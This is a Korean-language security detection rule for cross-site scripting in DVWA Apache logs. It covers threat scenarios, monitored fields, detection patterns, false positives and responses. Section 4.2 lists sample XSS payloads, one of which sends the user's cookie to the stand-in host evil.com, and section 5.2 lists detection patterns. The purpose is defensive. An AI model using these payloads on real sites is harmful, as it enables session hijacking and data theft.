# WEB-XSS-001: Cross-Site Scripting Detection Rule

## 1. 탐지 룰 개요

- **Rule ID**: WEB-XSS-001
- **공격 유형**: Cross-Site Scripting (XSS)
- **공격 분류**: Client-Side
- **로그 소스**: DVWA Apache access log
- **적용 단계**: Logstash (Classification / Enrichment)

---

## 2. 위협 시나리오 (Threat Scenario)

### 2.1 위협 개요

Cross-Site Scripting (XSS)은 웹 애플리케이션에 악성 스크립트를 삽입하여 **다른 사용자의 브라우저에서 실행**시키는 공격이다. 이를 통해 세션 하이재킹, 피싱, 키로깅, 악성코드 유포 등이 가능하다.

본 룰은 다음과 같은 시나리오를 탐지하기 위해 설계되었다.

- **Reflected XSS (Type 1)**
    - 즉시 반사되는 XSS
    - URL 파라미터를 통한 스크립트 삽입
    - 피싱 공격에 주로 활용
- **Stored XSS (Type 2)**
    - 데이터베이스에 저장되는 XSS
    - 게시판, 댓글, 프로필 등
    - 영구적인 피해 가능
- **DOM-based XSS (Type 0)**
    - 클라이언트 측 스크립트에서 발생
    - URL fragment (#) 활용
    - 서버 로그에 기록되지 않을 수 있음

### 2.2 보호 대상 자산과 영향

| 자산 | 영향 |
|------|------|
| 사용자 세션 | Session hijacking |
| 사용자 데이터 | Data theft |
| 웹 애플리케이션 | Defacement |
| 사용자 신뢰 | Phishing attacks |

---

## 3. 관측 신호 (Observable Signals)

### 3.1 로그 기반 관측 가능 지점

본 공격 시나리오는 **Apache access log**에서 다음 신호로 관측 가능하다.

- 요청 URL의 **query string**
- HTML 태그 및 JavaScript 코드
- 이벤트 핸들러
- URL 인코딩된 스크립트
- 특정 HTTP 메서드(GET, POST)

### 3.2 주요 관측 필드

| 필드 | 설명 |
|------|------|
| url.query | 스크립트 페이로드 |
| url.original | 전체 요청 URL |
| http.request.method | 요청 메서드 |
| http.response.status_code | 응답 코드 |
| source.ip | 공격 주체 IP |

---

## 4. 탐지 근거 (Detection Rationale)

본 탐지 룰은 다음 근거를 기반으로 정의되었다.

### 4.1 표준 및 권장 사항

#### OWASP Top 10

- https://owasp.org/Top10/
- **A03:2021 – Injection**

XSS는 클라이언트 측 코드 삽입 공격으로 분류된다.

#### CWE-79

- https://cwe.mitre.org/data/definitions/79.html
- Cross-site Scripting 취약점 표준 분류

### 4.2 프로젝트 실험 근거

DVWA XSS 모듈 실험 결과:

#### Reflected XSS
```
name=<script>alert('XSS')</script>
name=<img src=x onerror=alert(1)>
name=<svg onload=alert(1)>
```

#### Stored XSS
```
message=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
message=<iframe src="javascript:alert(1)"></iframe>
```

**관측된 패턴**:
- `<script>` 태그 사용
- 이벤트 핸들러 악용 (onerror, onload)
- JavaScript 프로토콜
- URL/HTML 인코딩 우회

---

## 5. 탐지 조건 (Detection Conditions)

### 5.1 기본 탐지 조건

| 조건 필드 | 조건 |
|----------|------|
| url.query | 스크립트 태그/이벤트 핸들러 |
| http.request.method | GET, POST |
| http.response.status_code | 200, 302, 500 |

### 5.2 탐지 패턴 상세 분류

#### Script Tags
```
<script>
</script>
<script src=
<SCRIPT>
```

#### Event Handlers
```
onerror=
onload=
onclick=
onmouseover=
onfocus=
onblur=
```

#### JavaScript Protocol
```
javascript:
vbscript:
data:text/html
```

#### HTML Tags
```
<img
<iframe
<svg
<object
<embed
<video
<audio
```

#### Encoded Patterns
```
%3Cscript%3E
%3Cimg
&lt;script&gt;
&#60;script&#62;
\x3cscript\x3e
```

---

## 6. 탐지 로직 (Detection Logic)

요청 URL의 query string에

HTML 태그, JavaScript 코드, 이벤트 핸들러, 또는 인코딩된 형태가 포함될 경우

해당 요청을 **XSS 의심 이벤트**로 분류한다.

---

## 7. 오탐 가능성 (False Positives)

- **코드 공유 사이트**
- **개발자 포럼**
- **HTML 에디터**
- **교육/테스트 환경**

---

## 8. 위험도 평가 및 근거

### 8.1 위험도

- **attack_severity**: Medium

### 8.2 위험도 평가 근거

1. **CVSS Score**: 6.1 (Medium)
2. **사용자 상호작용 필요**
3. **브라우저 보안 기능으로 일부 방어**

---

## 9. 대응 전략 (Response Strategy)

### 9.1 초기 대응

- 로그 기록 및 모니터링

### 9.2 2차 대응

- 1분 10회 이상 시 Alert
- IP 차단 고려

### 9.3 예방 조치

- Output Encoding
- Content Security Policy (CSP)
- X-XSS-Protection 헤더

---

## 10. 참고 자료

- **OWASP XSS**: https://owasp.org/www-community/attacks/xss/
- **CWE-79**: https://cwe.mitre.org/data/definitions/79.html
- **PortSwigger XSS**: https://portswigger.net/web-security/cross-site-scripting

---

## 11. 변경 이력

| 버전 | 날짜 | 변경 내용 | 작성자 |
|------|------|----------|--------|
| v1.0 | 2026-01-02 | 초기 룰 작성 | 2SeC Team |